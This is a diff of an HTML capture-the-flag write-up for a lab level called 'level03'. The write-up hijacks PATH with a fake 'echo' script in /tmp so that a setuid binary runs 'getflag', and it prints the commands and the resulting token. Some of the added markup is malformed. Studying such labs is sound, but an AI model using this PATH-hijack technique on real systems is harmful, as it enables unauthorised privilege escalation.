@@ -29,20 +29,16 @@
 	<li>It seems like <code>echo</code> is vulnerable to manipulation since it&#39;s called using <code>/usr/bin/env</code> which makes the computer use the first binary found in <code>PATH</code></li>
 	<li>So we should be able to create a script called echo to get the flag for us !
 	<blockquote>
-		<p>
-		<code>echo &#39;getflag&#39; &gt; /tmp/echo</code>
-		<code>export PATH=/tmp:$PATH</code>
-		<code>./level03</code>
-		</p>
+		<p><code>echo &#39;getflag&#39; &gt; /tmp/echo</code></p>
+		<p><code>export PATH=/tmp:$PATH</code></p>
+		<p><code>./level03</code></p>
 	</blockquote>
 	</li>
 	<li>DOESN&#39;T WORK ! WHY ? (Well I forgot a little something)
 		<blockquote>
-			<p>
-			<code>chmod +x /tmp/echo</code>
-			<code>./level03</code>
-			<code>Check flag.Here is your token : qi0maab88jeaj46qoumi7maus</code>
-			</p>
+			</p><code>chmod +x /tmp/echo</code></p>
+			</p><code>./level03</code></p>
+			</p><code>Check flag.Here is your token : qi0maab88jeaj46qoumi7maus</code></p>
 		</blockquote>
 	</li>
 </ul>
